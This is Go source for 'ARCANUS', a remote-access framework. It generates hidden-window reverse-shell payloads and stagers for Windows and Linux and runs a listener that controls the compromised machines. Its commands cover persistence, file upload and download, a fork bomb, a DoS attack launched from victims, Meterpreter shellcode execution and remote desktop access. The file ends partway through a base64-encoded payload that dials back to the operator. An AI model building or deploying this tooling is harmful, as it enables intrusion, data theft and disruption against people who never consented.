package main

import "net"
import "time"
import "net/http"
import "fmt"
import "bufio"
import "os"
import "strings"
import "runtime"
import "io"
import "io/ioutil"
import "encoding/base64"
import "github.com/fatih/color"
import "os/exec"
import "path/filepath"

var SysGuide []string
var GLOBAL__Command string
var Menu_Selector int
var Listen_Port string
var Payload PAYLOAD
var Conn_Point *net.Conn

const BUFFER_SIZE int = 1024
const VERSION string = "1.5.6"


type PAYLOAD struct {
  Ip string
  Port string
  Type string
}

func main() {

  CLEAR_SCREEN()
  BANNER()
  MAIN_MENU()
  fmt.Scan(&Menu_Selector) // Main Menu

  for {
    if Menu_Selector == 1 {
      CLEAR_SCREEN()
      BANNER()
      PAYLOAD_MENU()
      fmt.Scan(&Menu_Selector) // Payload Menu
      if Menu_Selector == 1 {
        Payload.Type = "Windows"
      }else if Menu_Selector == 2 {
        Payload.Type = "Linux"
      }else if Menu_Selector == 3 {
        Payload.Type = "Stager_Windows"
      }else if Menu_Selector == 4 {
        Payload.Type = "Stager_Linux"
      }
      fmt.Print("\nEnter Listening Port: ")
      fmt.Scan(&Listen_Port)
      if Payload.Type == "Stager_Windows" {
        GENERATE_WINDOWS_PAYLOAD()
      }else if Payload.Type == "Stager_Linux" {
        GENERATE_LINUX_PAYLOAD()
      }
      CLEAR_SCREEN()
      BANNER()
      color.Yellow("\n[*] Port:"+string(Listen_Port))
      break
    }else if Menu_Selector == 2 {
      Payload.Type = "Windows"
      CLEAR_SCREEN()
      BANNER()
      fmt.Print("\nEnter Listening Ip: ")
      fmt.Scan(&Payload.Ip)
      fmt.Print("\nEnter Listening Port: ")
      fmt.Scan(&Payload.Port)
      Listen_Port = Payload.Port
      GENERATE_WINDOWS_PAYLOAD()
      CLEAR_SCREEN()
      BANNER()
      if runtime.GOOS == "windows" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] Payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }else if runtime.GOOS == "linux" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] Payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }
      break
    }else if Menu_Selector == 3 {
      Payload.Type = "Linux"
      CLEAR_SCREEN()
      BANNER()
      fmt.Print("\nEnter Listening Ip: ")
      fmt.Scan(&Payload.Ip)
      fmt.Print("\nEnter Listening Port: ")
      fmt.Scan(&Payload.Port)
      Listen_Port = Payload.Port
      GENERATE_LINUX_PAYLOAD()
      CLEAR_SCREEN()
      BANNER()
      if runtime.GOOS == "windows" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] Payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }else if runtime.GOOS == "linux" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] Payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }
      break
    }else if Menu_Selector == 4 {
      Payload.Type = "Stager_Windows"
      CLEAR_SCREEN()
      BANNER()
      fmt.Print("\nEnter Listening Ip: ")
      fmt.Scan(&Payload.Ip)
      fmt.Print("\nEnter Listening Port: ")
      fmt.Scan(&Payload.Port)
      Listen_Port = Payload.Port
      GENERATE_WINDOWS_STAGER_PAYLOAD()
      CLEAR_SCREEN()
      BANNER()
      if runtime.GOOS == "windows" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] First stage payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }else if runtime.GOOS == "linux" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] First stage payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }
      break
    }else if Menu_Selector == 5 {
      Payload.Type = "Stager_Linux"
      CLEAR_SCREEN()
      BANNER()
      fmt.Print("\nEnter Listening Ip: ")
      fmt.Scan(&Payload.Ip)
      fmt.Print("\nEnter Listening Port: ")
      fmt.Scan(&Payload.Port)
      Listen_Port = Payload.Port
      GENERATE_LINUX_STAGER_PAYLOAD()
      CLEAR_SCREEN()
      BANNER()
      if runtime.GOOS == "windows" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] First stage payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }else if runtime.GOOS == "linux" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] First stage payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }
      break
    }else if Menu_Selector == 6 {
      	response, err := http.Get("https://raw.githubusercontent.com/EgeBalci/ARCANUS/master/SOURCE/ARCANUS.go");
      	if err != nil {
      		color.Red("\n[!] Update Connection Failed !")
      		fmt.Println(err)
      	};
      	defer response.Body.Close();
      	body, _ := ioutil.ReadAll(response.Body);
    	if strings.Contains(string(body), string(VERSION)) {
        	color.Green("\n[+] Arcanus Version Up To Date !")
        	time.Sleep(2*time.Second)
        	main()
      	}else{
        	color.Blue("\n[*] New Version Detected !")
        	var Choice string = "N"
        	color.Blue("\n[?] Do You Want To Update ? (Y/N) : ")
        	fmt.Print("\n\n>>")
        	fmt.Scan(&Choice)
        	if Choice == "Y" || Choice == "y" {
          		if runtime.GOOS == "windows" {
            		color.Yellow("\n[*] Updating ARCANUS...")
            		exec.Command("cmd", "/C", "Update.exe").Start()
            		os.Exit(1)
          		}else if runtime.GOOS == "linux" {
            		color.Yellow("\n[*] Updating ARCANUS...")
            		Update, _ := os.Create("Update.sh")

            		Update.WriteString("chmod 777 Update\n./Update")
            		Update.Close()
            		exec.Command("sh", "-c", "chmod 777 Update && ./Update.sh").Run()
            		exec.Command("sh", "-c", "./Update.sh").Run()
            		exec.Command("sh", "-c", "rm Update.sh").Run()
            		os.Exit(1)
          		}
        	}else if Choice == "N" || Choice == "n" {
          		main()
        	}else{
          		color.Blue("\n[?] Do You Want To Update ? (Y/N) : ")
          		fmt.Scan(&Choice)
          		fmt.Print("\n\n>>")
        	}
      	}
    }else{
      main()
    }
  }



  if Payload.Type == "Stager_Windows" || Payload.Type == "Stager_Linux" {
    color.Yellow("\n[*] Listening For Reverse TCP Stager Shell...")
    ln, _ := net.Listen("tcp", ":"+Listen_Port)
    connect, _ := ln.Accept()
    color.Green("[+] Connection Established !")
    file, err := os.Open("Payload.exe")
    if err != nil {
      color.Red("\n[-] Eror while accesing Payload.exe !")
      color.Red("\n[*] Put second stage payload on same directory with ARCANUS and rename it \"Payload.exe\" ")
    }
    color.Yellow("[*] Sending Second Stage Payload...")
    io.Copy(connect, file)
    color.Green("[+] Payload transfer completed !")
    color.Yellow("[*] Executeing Second Stage Payload...")
    runtime.GC()
  }


  color.Yellow("\n[*] Listening For Reverse TCP Shell...")
  ln, _ := net.Listen("tcp", ":"+Listen_Port)
  connect, err := ln.Accept()
  if err != nil {
    fmt.Println(err)
  }
  reader := bufio.NewReader(os.Stdin)
  var SysInfo = make([]byte, BUFFER_SIZE)
  fmt.Print("\x07") // Connection Launched !
  color.Green("\n[+] Connection Established !\n")
  connect.Read([]byte(SysInfo))
  SysGuide = strings.Split(string(SysInfo), "£>")
  color.Green("\n[+] Remote Address -> " , connect.RemoteAddr())

  color.Green(string(("\n\n[+] OS Version Captured" + SysGuide[1])))



  if Payload.Type == "Linux" || Payload.Type == "Stager_Linux" {
    for {
      runtime.GC()
      fmt.Print("\n")
      fmt.Print("\n")
      fmt.Print(string(SysGuide[0]) + ">")
      Command, _ := reader.ReadString('\n')
      _Command := string(Command)
      GLOBAL__Command = _Command
      runtime.GC()
      var cmd_out []byte
      connect.Write([]byte(Command))
      go connect.Read([]byte(cmd_out))
      fmt.Println(string(cmd_out))
    }
  }

  for {

    var cmd_out = make([]byte,BUFFER_SIZE)
    runtime.GC()
    fmt.Print("\n")
    fmt.Print("\n")
    fmt.Print(string(SysGuide[0]) + ">")
    Command, _ := reader.ReadString('\n')
    _Command := string(Command)
    GLOBAL__Command = _Command

    if strings.Contains(_Command, "£METERPRETER") || strings.Contains(_Command, "£meterpreter") {
      color.Green("\n[*] Meterpreter Code Send !")
      connect.Write([]byte(Command))
    }else if strings.Contains(_Command, "£desktop") || strings.Contains(_Command, "£DESKTOP") {
      if Payload.Type == "Windows" || Payload.Type == "Stager_Windows" {
        connect.Write([]byte(Command))
        connect.Read([]byte(cmd_out))
        Command_Output := strings.Split(string(cmd_out), "£>")
        if strings.Contains(string(Command_Output[0]), "failed") {
          color.Red("\n[-] Remote desktop connection failed ! (Acces denied, The requested operation requires Administration elavation.) ")
        }else{
          color.Green("\n[+] Remote desktop connection configurations succesfull !.")
          color.Green("\n >>> Remote Address >>> " , connect.RemoteAddr())
          if runtime.GOOS == "windows" {
            exec.Command("cmd", "/C", "mstsc").Run()
          }
        }
      }else{
        color.Red("\n[-] This payload type does not support \"REMOTE DESKTOP\" module !")
      }
    }else if strings.Contains(_Command, "£persistence") || strings.Contains(_Command, "£PERSISTENCE") {
    	connect.Write([]byte(GLOBAL__Command))
    }else if strings.Contains(_Command, "£help") || strings.Contains(_Command, "£HELP")  {
      if runtime.GOOS == "windows" {
        HELP_SCREEN_WIN()
      }else if runtime.GOOS == "linux" {
        HELP_SCREEN_LINUX()
      }
    }else if strings.Contains(_Command, "£upload -f") || strings.Contains(_Command, "£UPLOAD -F") {
      connect.Write([]byte(_Command))
      file_name := strings.Split(GLOBAL__Command, "\"")
      color.Yellow("\n[*] Uploading ---> "+file_name[1])
      go UPLOAD_VIA_TCP()
    }else if strings.Contains(_Command, "£download") || strings.Contains(_Command, "£DOWNLOAD") {
      connect.Write([]byte(Command))
      go DOWNLOAD_VIA_TCP()
    }else if strings.Contains(_Command, "£DISTRACT") || strings.Contains(_Command, "£distract") {
      connect.Write([]byte(Command))
      color.Yellow("\n[*] Preparing fork bomb...")
      color.Green("\n[+] Distraction Started !")
    }else if strings.Contains(_Command, "£DOS") || strings.Contains(_Command, "£dos") {
      DOS_Target := strings.Split(GLOBAL__Command, "\"")
      if strings.Contains(DOS_Target[1], "http//") || strings.Contains(DOS_Target[1], "https//") {
        connect.Write([]byte(Command))
        color.Yellow("\n[*] Starting DOS Atack to --> "+DOS_Target[1])
        color.Green("\n[+] DOS Atack Started !")
        color.Green("\n[+] Sending 1000 GET request to target...")
      }else{
        color.Red("\n[-] ERROR: Invalid URL type !")
      }
    }else{
      connect.Write([]byte(Command))
      for {
        connect.Read([]byte(cmd_out))
        if !strings.Contains(string(cmd_out), "£>") {
          fmt.Println(string(cmd_out))
        }else{
          Command_Output := strings.Split(string(cmd_out), "£>")
          fmt.Println(string(Command_Output[0]))
          break
        }
      }
    }
  }
}




func UPLOAD_VIA_TCP() {
  ln, _ := net.Listen("tcp", ":55888")
  connect, _ := ln.Accept()
  file_name := strings.Split(GLOBAL__Command, "\"")
  file, err := os.Open(file_name[1])
  if err != nil {
    color.Red("Eror while opening file !")
    fmt.Println(err)
  }
  defer file.Close()
  io.Copy(connect, file)
  color.Green("\n\n[+] File transfer completed !")
  fmt.Print("\n")
  fmt.Print("\n")
  fmt.Print(string(SysGuide[0]) + ">")
  connect.Close()
}


func DOWNLOAD_VIA_TCP() {
  file_name := strings.Split(GLOBAL__Command, "\"")
  color.Yellow("\n\n[*] Downloading "+string(file_name[1]))
  ln, _ := net.Listen("tcp", ":55888")
  connect, _ := ln.Accept()
  file, _ := os.Create(file_name[1])
  defer file.Close()
  io.Copy(file, connect)
  file.Close()
  connect.Close()
  color.Green("\n[+] File download completed !")
  fmt.Print("\n")
  fmt.Print("\n")
  fmt.Print(string(SysGuide[0]) + ">")
}


func BANNER() {

  Green := color.New(color.FgGreen)
  BoldGreen := Green.Add(color.Bold)
  Yellow := color.New(color.FgYellow)
  BoldYellow := Yellow.Add(color.Bold)
  Red := color.New(color.FgRed)
  BoldRed := Red.Add(color.Bold)


  if runtime.GOOS == "windows" {
    color.Red("            ___  ______  _____   ___   _   _ _   _ _____ ")
    color.Red("           / _ \\ | ___ \\/  __ \\ / _ \\ | \\ | | | | /  ___|")
    color.Red("          / /_\\ \\| |_/ /| /  \\// /_\\ \\|  \\| | | | \\ `--. ")
    color.Red("          |  _  ||    / | |    |  _  || . ` | | | |`--. \\")
    color.Red("          | | | || |\\ \\ | \\__/\\| | | || |\\  | |_| /\\__/ /")
    color.Red("          \\_| |_/\\_| \\_| \\____/\\_| |_/\\_| \\_/\\___/\\____/ ")
    color.Green("\n\n+ -- --=[      ARCANUS FRAMEWORK                  ]")
    color.Green("+ -- --=[ Version: "+VERSION+"                          ]")
    color.Green("+ -- --=[ Support: arcanusframework@gmail.com     ]")
    color.Green("+ -- --=[          Created By Ege Balcı           ]")
  }else if runtime.GOOS == "linux" {
    BoldRed.Println("           _______  _______  _______  _______  _                 _______ ")
    BoldRed.Println("          (  ___  )(  ____ )(  ____ \\(  ___  )( (    /||\\     /|(  ____ \\")
    BoldRed.Println("          | (   ) || (    )|| (    \\/| (   ) ||  \\  ( || )   ( || (    \\/")
    BoldRed.Println("          | (___) || (____)|| |      | (___) ||   \\ | || |   | || (_____ ")
    BoldRed.Println("          |  ___  ||     __)| |      |  ___  || (\\ \\) || |   | |(_____  )")
    BoldRed.Println("          | (   ) || (\\ (   | |      | (   ) || | \\   || |   | |      ) |")
    BoldRed.Println("          | )   ( || ) \\ \\__| (____/\\| )   ( || )  \\  || (___) |/\\____) |")
    BoldRed.Println("          |/     \\||/   \\__/(_______/|/     \\||/    )_)(_______)\\_______)")

    color.Green("\n\n+ -- --=[      ARCANUS FRAMEWORK                  ]")
    color.Green("+ -- --=[ Version: "+VERSION+"                          ]")
    color.Green("+ -- --=[ Support: arcanusframework@gmail.com     ]")
    color.Green("+ -- --=[               Ege Balcı                 ]")

  }
}

func CLEAR_SCREEN() {
  if runtime.GOOS == "windows" {
    Clear := exec.Command("cmd", "/C", "cls")
    Clear.Stdout = os.Stdout
    Clear.Run()
  }else if runtime.GOOS == "linux" {
    Clear := exec.Command("clear")
    Clear.Stdout = os.Stdout
    Clear.Run()
  }
}

func GENERATE_WINDOWS_PAYLOAD() {
  Payload.Ip = string("\""+Payload.Ip+"\";")
  Payload.Port = string("\""+Payload.Port+"\";")
  Payload_Source, err := os.Create("Payload.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()

  WINDOWS_PAYLOAD, _ := base64.StdEncoding.DecodeString(WIN_PAYLOAD)

  Index := strings.Replace(string(WINDOWS_PAYLOAD), "\"127.0.0.1\";", Payload.Ip, -1)
  Index = strings.Replace(Index, "\"8552\";", Payload.Port, -1)
  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    Builder, err := os.Create("Build.bat")
    if err != nil {
      fmt.Println(err)
    }
    Build_Code := string("go build -ldflags \"-H windowsgui -s\" Payload.go ")
    Builder.WriteString(Build_Code)
    runtime.GC()
    exec.Command("cmd", "/C", "Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", " del Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", "del Payload.go").Run()
    runtime.GC()
  }else if runtime.GOOS == "linux" {
    exec.Command("sh", "-c", "export GOOS=windows && export GOARCH=386 && go build -ldflags \"-H windowsgui -s\" Payload.go").Run()
    runtime.GC()
    exec.Command("sh", "-c", "rm Payload.go").Run()
  }
}



func GENERATE_LINUX_PAYLOAD() {
  Payload.Ip = string("\""+Payload.Ip+"\";")
  Payload.Port = string("\""+Payload.Port+"\";")
  Payload_Source, err := os.Create("Payload.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()

  Linux_Payload, _ := base64.StdEncoding.DecodeString(LINUX_PAYLOAD)

  Index := strings.Replace(string(Linux_Payload), "\"127.0.0.1\";", Payload.Ip, -1)
  Index = strings.Replace(Index, "\"8552\";", Payload.Port, -1)
  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    Builder, err := os.Create("Build.bat")
    if err != nil {
      fmt.Println(err)
    }
    var Build_Code = `
    set GOOS=linux
    set GOARCH=386
    go build Payload.go
    set GOOS=windows
    set GOARCH=amd64
    `
    Builder.WriteString(Build_Code)
    runtime.GC()
    exec.Command("cmd", "/C", "Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", " del Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", "del Payload.go").Run()
    runtime.GC()
  }else if runtime.GOOS == "linux" {

    exec.Command("sh", "-c", "go build Payload.go").Run()
    runtime.GC()
    exec.Command("sh", "-c", "rm Payload.go").Run()
  }
}

func GENERATE_WINDOWS_STAGER_PAYLOAD() {
  go GENERATE_WINDOWS_PAYLOAD()
  Stager_Payload_Ip := string("\""+Payload.Ip+"\";")
  Stager_Payload_Port := string("\""+Payload.Port+"\";")
  Payload_Source, err := os.Create("Stage_1.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()

  WIN_STAGER, _ := base64.StdEncoding.DecodeString(WIN_STAGER_PAYLOAD)

  Index := strings.Replace(string(WIN_STAGER), "\"127.0.0.1\";", Stager_Payload_Ip, -1)
  Index = strings.Replace(Index, "\"8552\";", Stager_Payload_Port, -1)
  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    Builder, err := os.Create("Build_Stager.bat")
    if err != nil {
      fmt.Println(err)
    }
    Build_Code := string("go build -ldflags \"-s -H windowsgui\" Stage_1.go ")
    Builder.WriteString(Build_Code)
    runtime.GC()
    Build_Stager := exec.Command("cmd", "/C", "Build_Stager.bat");
    Build_Stager.Run()
    runtime.GC()
    Del_Stager := exec.Command("cmd", "/C", "del Stage_1.go");
    Del_Stager.Run()
    runtime.GC()
    Del_Stager_2 := exec.Command("cmd", "/C", "del Build_Stager.bat");
    Del_Stager_2.Run()
    runtime.GC()
  }else if runtime.GOOS == "linux" {
    exec.Command("sh", "-c", "export GOOS=windows && export GOARCH=386 && go build -ldflags \"-s -H windowsgui\" Stage_1.go").Run()
    runtime.GC()
    exec.Command("sh", "-c", "rm Stage_1.go").Run()
    runtime.GC()
  }
}


func GENERATE_LINUX_STAGER_PAYLOAD() {
  go GENERATE_LINUX_PAYLOAD()
  Stager_Payload_Ip := string("\""+Payload.Ip+"\";")
  Stager_Payload_Port := string("\""+Payload.Port+"\";")
  Payload_Source, err := os.Create("Stage_1.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()

  LINUX_STAGER, _ := base64.StdEncoding.DecodeString(LINUX_STAGER_PAYLOAD)

  Index := strings.Replace(string(LINUX_STAGER), "\"127.0.0.1\";", Stager_Payload_Ip, -1)
  Index = strings.Replace(Index, "\"8552\";", Stager_Payload_Port, -1)
  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    Builder, err := os.Create("Build_Stager.bat")
    if err != nil {
      fmt.Println(err)
    }
    Build_Code := `
    SET GOOS=linux
    SET GOARCH=386
    go build Stage_1.go`
    Builder.WriteString(Build_Code)
    runtime.GC()
    Build_Stager := exec.Command("cmd", "/C", "Build_Stager.bat");
    Build_Stager.Run()
    runtime.GC()
    Del_Stager := exec.Command("cmd", "/C", "del Stage_1.go");
    Del_Stager.Run()
    runtime.GC()
    Del_Stager_2 := exec.Command("cmd", "/C", "del Build_Stager.bat");
    Del_Stager_2.Run()
    runtime.GC()
  }else if runtime.GOOS == "linux" {
    exec.Command("sh", "-c", "go build Stage_1.go").Run()
    runtime.GC()
    exec.Command("sh", "-c", "rm Stage_1.go").Run()
    runtime.GC()
  }
}



func MAIN_MENU() {

  color.Yellow("\n [1] START LISTENING")
  color.Yellow("\n [2] GENERATE WINDOWS PAYLOAD                   (4.5 Mb)")
  color.Yellow("\n [3] GENERATE LINUX PAYLOAD                     (3.6 Mb)")
  color.Yellow("\n [4] GENERATE STAGER WINDOWS PAYLOAD            (2.0 Mb)")
  color.Yellow("\n [5] GENERATE STAGER LINUX PAYLOAD              (2.0 Mb)")
  color.Yellow("\n [6] UPDATE")
  fmt.Print("\n\n>>")
}


func PAYLOAD_MENU() {
  color.Yellow("\n\n[1] Windows payload")
  color.Yellow("[2] Linux payload")
  color.Yellow("[3] Stager windows payload")
  color.Yellow("[4] Stager linux payload")
  fmt.Print("\n\n>>")
}

func HELP_SCREEN_LINUX() {
  color.Yellow("#===================================================================================================#")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   [ COMMAND ]                                       [DESCRIPTION]                                 |")
  color.Yellow("|  ===================================              ======================================          |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £METERPRETER -C \"powershell shellcode\":   This command executes given powershell            |")
  color.Yellow("|                                                      shellcode for metasploit integration.        |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £PERSISTENCE:                                 This command installs a persistence module    |")
  color.Yellow("|                                                       to remote computer for continious acces.    |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £DISTRACT:                                   This command executes a fork bomb bat file to  |")
  color.Yellow("|                                                       distrackt the remote user.                  |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £UPLOAD -F \"filename.exe\":                This command uploads a choosen file to            |")
  color.Yellow("|                                                       remote computer via tcp socket stream.      |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £UPLOAD -G:                                   This command uploads a choosen file to        |")
  color.Yellow("|                                                       remote computer via http get method.        |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £DOWNLOAD -F \"filename.exe\":              This command download a choosen file              |")
  color.Yellow("|                                                       from remote computer via tcp socket stream. |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £DOS -A \"www.site.com\":               This command starts a denial of service atack to    |")
  color.Yellow("|                                                                         given website address.    |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £PLEASE \"any command\":                    This command asks users comfirmation for          |")
  color.Yellow("|                                                       higher privilidge operations.               |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £DESKTOP                                      This command adjusts remote desktop options   |")
  color.Yellow("|                                                       for remote connection on target machine     |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("#===================================================================================================#")
}



func HELP_SCREEN_WIN() {

  color.Yellow("#=============================================================================#")//
  color.Yellow("|                                                                             |")
  color.Yellow("|   [ COMMAND ]                                               [DESCRIPTION]   |")
  color.Yellow("|  ==============                                            ================ |")
  color.Yellow("|                                                                             |")
  color.Yellow("|  £METERPRETER -C \"powershell shellcode\":     This command executes given    |")
  color.Yellow("|                                                   powershell shellcode for  |")
  color.Yellow("|                                                   metasploit integration.   |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £PERSISTENCE:               This command installs a persistence module to   |")
  color.Yellow("|                                       remote computer for continious acces. |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £UPLOAD -F \"filename.exe\":        This command uploads a choosen file to    |")
  color.Yellow("|                                      remote computer via tcp socket stream. |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £UPLOAD -G:                   This command uploads a choosen file to remote |")
  color.Yellow("|                                             computer via http get method.   |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £DOWNLOAD -F \"filename.exe\":  This command download a choosen file from     |")
  color.Yellow("|                                      remote computer via tcp socket stream. |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £DISTRACT:                    This command executes a fork bomb bat file to |")
  color.Yellow("|                                                distrackt the remote user.   |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £DOS -A \"www.site.com\":    This command starts a denial of service atack    |")
  color.Yellow("|                                                      given website address. |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £PLEASE \"any command\":           This command asks users comfirmation for   |")
  color.Yellow("|                                              higher privilidge operations.  |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £DESKTOP                        This command adjusts remote desktop options |")
  color.Yellow("|                                    for remote connection on target machine  |")
  color.Yellow("|                                                                             |")
  color.Yellow("#=============================================================================#")
}



var WIN_PAYLOAD string = "CnBhY2thZ2UgbWFpbjsKCmltcG9ydCAibmV0IjsKaW1wb3J0ICJvcy9leGVjIjsKaW1wb3J0ICJidWZpbyI7CmltcG9ydCAib3MiOwppbXBvcnQgInN0cmluZ3MiOwppbXBvcnQgInBhdGgvZmlsZXBhdGgiOwppbXBvcnQgInJ1bnRpbWUiOwppbXBvcnQgInN5c2NhbGwiOwppbXBvcnQgIm5ldC9odHRwIjsKaW1wb3J0ICJ0aW1lIjsKaW1wb3J0ICJpby9pb3V0aWwiOwppbXBvcnQgImVuY29kaW5nL2Jhc2U2NCIKaW1wb3J0ICJpbyI7CmltcG9ydCAiZm10IgoKdmFyIEdsb2JhbF9fQ29tbWFuZCBzdHJpbmc7CnZhciBmaWxlX3RyYW5zZmVyX3N1Y2NlcyBib29sOwp2YXIgRE9TX1RhcmdldCBzdHJpbmc7CnZhciBET1NfUmVxdWVzdF9Db3VudGVyIGludCA9IDA7CnZhciBET1NfUmVxdWVzdF9MaW1pdCBpbnQgPSAxMDAwOwoKY29uc3QgVklDVElNX0lQIHN0cmluZyA9ICIxMjcuMC4wLjEiOwpjb25zdCBWSUNUSU1fUE9SVCBzdHJpbmcgPSAiODU1MiI7CgpmdW5jIG1haW4oKSB7CgogIGNvbm5lY3QsIGVyciA6PSBuZXQuRGlhbCgidGNwIiwgVklDVElNX0lQKyI6IitWSUNUSU1fUE9SVCk7CiAgaWYgZXJyICE9IG5pbCB7CiAgICB0aW1lLlNsZWVwKDUqdGltZS5TZWNvbmQpOwogICAgbWFpbigpOwogIH07CgogIGRpciwgXyA6PSBmaWxlcGF0aC5BYnMoZmlsZXBhdGguRGlyKG9zLkFyZ3NbMF0pKTsKICBWZXJzaW9uX0NoZWNrIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgInZlciIpOwogIFZlcnNpb25fQ2hlY2suU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICB2ZXJzaW9uLCBfIDo9IFZlcnNpb25fQ2hlY2suT3V0cHV0KCk7CiAgU3lzR3VpZGUgOj0gKHN0cmluZyhkaXIpICsgIiDCoz4gIiArIHN0cmluZyh2ZXJzaW9uKSArICIgwqM+ICIpOwogIGNvbm5lY3QuV3JpdGUoW11ieXRlKHN0cmluZyhTeXNHdWlkZSkpKTsKCgoKICBmb3IgewoKICAgIENvbW1hbmQsIF8gOj0gYnVmaW8uTmV3UmVhZGVyKGNvbm5lY3QpLlJlYWRTdHJpbmcoJ1xuJyk7CiAgICBfQ29tbWFuZCA6PSBzdHJpbmcoQ29tbWFuZCk7CiAgICBHbG9iYWxfX0NvbW1hbmQgPSBfQ29tbWFuZDsKCgoKICAgIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICLCo3VwbG9hZCAtZyIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICLCo1VQTE9BRCAtRyIpIHsKICAgICAgVVBMT0FEX1ZJQV9HRVQoKTsKICAgICAgdmFyIHRyYW5zZmVyX3Jlc3BvbnNlIHN0cmluZzsKICAgICAgaWYgZmlsZV90cmFuc2Zlcl9zdWNjZXMgPT0gdHJ1ZSB7CiAgICAgICAgdHJhbnNmZXJfcmVzcG9uc2UgPSAiWytdIEZpbGUgVHJhbnNmZXIgU3VjY2Vzc2Z1bGwgISDCoz4iOwogICAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKHN0cmluZyh0cmFuc2Zlcl9yZXNwb25zZSkpKTsKICAgICAgfTsKICAgICAgaWYgZmlsZV90cmFuc2Zlcl9zdWNjZXMgPT0gZmFsc2UgewogICAgICAgIHRyYW5zZmVyX3Jlc3BvbnNlID0gIlstXSBGaWxlIFRyYW5zZmVyIEZhaWxlZCAhIMKjPiI7CiAgICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoc3RyaW5nKHRyYW5zZmVyX3Jlc3BvbnNlKSkpOwogICAgICB9OwogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIsKjcGxlYXNlIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIsKjUExFQVNFIikgewogICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZShTQVlfUExFQVNFKCkpKTsKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICLCo2Rvd25sb2FkIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIsKjRE9XTkxPQUQiKSB7CiAgICAgIGdvIERPV05MT0FEX1ZJQV9UQ1AoKTsKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICLCo3VwbG9hZCAtZiIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICLCo1VQTE9BRCAtRiAiKSB7CiAgICAgIGdvIFVQTE9BRF9WSUFfVENQKCk7CiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAiwqNNRVRFUlBSRVRFUiAtQyIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICLCo21ldGVycHJldGVyIC1jIikgewo